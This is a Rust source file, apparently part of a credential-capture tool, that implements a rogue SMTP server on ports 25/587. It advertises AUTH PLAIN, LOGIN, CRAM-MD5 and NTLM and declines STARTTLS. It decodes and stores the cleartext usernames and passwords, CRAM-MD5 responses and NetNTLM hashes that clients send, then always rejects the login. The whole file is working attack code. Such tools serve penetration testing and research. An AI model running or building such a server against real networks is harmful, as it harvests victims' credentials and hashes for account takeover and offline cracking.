//! Rogue SMTP server (TCP 25/587) capturing AUTH PLAIN/LOGIN, CRAM-MD5 and cleartext.

use std::net::SocketAddr;
use std::sync::Arc;

use anyhow::Result;
use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as B64;
use tokio::io::{AsyncRead, AsyncWrite};
use tokio::net::TcpListener;

use crate::capture::model::{ArtifactType, CaptureArtifact, Protocol};

use super::{ServerContext, read_line, write_str};

pub async fn serve(listener: TcpListener, ctx: Arc<ServerContext>, _tls: bool) -> Result<()> {
    loop {
        let (stream, peer) = listener.accept().await?;
        let ctx = ctx.clone();
        tokio::spawn(async move {
            let _ = handle(stream, peer, ctx).await;
        });
    }
}

async fn handle<S: AsyncRead + AsyncWrite + Unpin>(
    mut s: S,
    peer: SocketAddr,
    ctx: Arc<ServerContext>,
) -> Result<()> {
    let host = ctx.netbios();
    write_str(&mut s, &format!("220 {host} ESMTP\r\n")).await?;
    while let Some(line) = read_line(&mut s).await {
        let mut parts = line.splitn(2, ' ');
        let cmd = parts.next().unwrap_or("").to_ascii_uppercase();
        let arg = parts.next().unwrap_or("").trim().to_string();
        match cmd.as_str() {
            "EHLO" => {
                let caps = format!(
                    "250-{host}\r\n250-AUTH PLAIN LOGIN CRAM-MD5 DIGEST-MD5 NTLM\r\n250 OK\r\n"
                );
                write_str(&mut s, &caps).await?;
            }
            "HELO" => write_str(&mut s, &format!("250 {host}\r\n")).await?,
            "AUTH" => handle_auth(&mut s, &arg, peer, &ctx).await?,
            "MAIL" | "RCPT" | "RSET" | "NOOP" => write_str(&mut s, "250 OK\r\n").await?,
            "DATA" => {
                write_str(&mut s, "354 End data with <CR><LF>.<CR><LF>\r\n").await?;
                while let Some(l) = read_line(&mut s).await {
                    if l == "." {
                        break;
                    }
                }
                write_str(&mut s, "250 OK\r\n").await?;
            }
            "STARTTLS" => write_str(&mut s, "454 TLS not available\r\n").await?,
            "QUIT" => {
                write_str(&mut s, "221 Bye\r\n").await?;
                break;
            }
            _ => write_str(&mut s, "502 Command not implemented\r\n").await?,
        }
    }
    Ok(())
}

async fn handle_auth<S: AsyncRead + AsyncWrite + Unpin>(
    s: &mut S,
    arg: &str,
    peer: SocketAddr,
    ctx: &ServerContext,
) -> Result<()> {
    let mut it = arg.splitn(2, ' ');
    let mech = it.next().unwrap_or("").to_ascii_uppercase();
    let initial = it.next().unwrap_or("").trim().to_string();
    match mech.as_str() {
        "PLAIN" => {
            let body = if initial.is_empty() {
                write_str(s, "334 \r\n").await?;
                read_line(s).await.unwrap_or_default()
            } else {
                initial
            };
            if let Ok(decoded) = B64.decode(body.trim()) {
                let fields: Vec<&[u8]> = decoded.split(|&b| b == 0).collect();
                let user = fields
                    .get(1)
                    .map(|u| String::from_utf8_lossy(u).to_string());
                let pass = fields
                    .get(2)
                    .map(|p| String::from_utf8_lossy(p).to_string());
                if let (Some(u), Some(p)) = (user, pass)
                    && let Some(art) = CaptureArtifact::cleartext(Protocol::Smtp, peer.ip(), &u, &p)
                {
                    ctx.sink.artifact(art);
                }
            }
            write_str(s, "535 Authentication failed\r\n").await?;
        }
        "LOGIN" => {
            write_str(s, "334 VXNlcm5hbWU6\r\n").await?;
            let user = decode_line(s).await;
            write_str(s, "334 UGFzc3dvcmQ6\r\n").await?;
            let pass = decode_line(s).await;
            if let (Some(u), Some(p)) = (user, pass)
                && let Some(art) = CaptureArtifact::cleartext(Protocol::Smtp, peer.ip(), &u, &p)
            {
                ctx.sink.artifact(art);
            }
            write_str(s, "535 Authentication failed\r\n").await?;
        }
        "CRAM-MD5" => {
            let token = super::random_bytes(16);
            write_str(s, &format!("334 {}\r\n", B64.encode(&token))).await?;
            if let Some(resp) = read_line(s).await
                && let Ok(decoded) = B64.decode(resp.trim())
            {
                let text = String::from_utf8_lossy(&decoded).to_string();
                if let Some((user, mac)) = crate::crypto::challenge::parse_cram_md5(&text) {
                    let art = CaptureArtifact::challenge_response(
                        Protocol::Smtp,
                        ArtifactType::CramMd5,
                        peer.ip(),
                        &user,
                        &mac,
                    );
                    ctx.sink.artifact(art);
                }
            }
            write_str(s, "535 Authentication failed\r\n").await?;
        }
        "NTLM" => {
            // Offer the NTLM challenge so a client can complete and be captured.
            let challenge = ctx.build_challenge(crate::constants::Service::Smtp);
            write_str(s, &format!("334 {}\r\n", B64.encode(&challenge))).await?;
            if let Some(resp) = read_line(s).await
                && let Ok(decoded) = B64.decode(resp.trim())
            {
                let ch = ctx.challenge_for(crate::constants::Service::Smtp);
                if let Some(net) = crate::protocols::ntlm::parse_type3(&decoded, &ch) {
                    ctx.sink
                        .artifact(CaptureArtifact::netntlm(Protocol::Smtp, peer.ip(), &net));
                }
            }
            write_str(s, "535 Authentication failed\r\n").await?;
        }
        _ => write_str(s, "504 Unrecognized authentication type\r\n").await?,
    }
    Ok(())
}

async fn decode_line<S: AsyncRead + AsyncWrite + Unpin>(s: &mut S) -> Option<String> {
    let line = read_line(s).await?;
    let decoded = B64.decode(line.trim()).ok()?;
    Some(String::from_utf8_lossy(&decoded).to_string())
}

pub async fn handle_stream<S: AsyncRead + AsyncWrite + Unpin>(
    s: S,
    peer: SocketAddr,
    ctx: Arc<ServerContext>,
) -> Result<()> {
    handle(s, peer, ctx).await
}
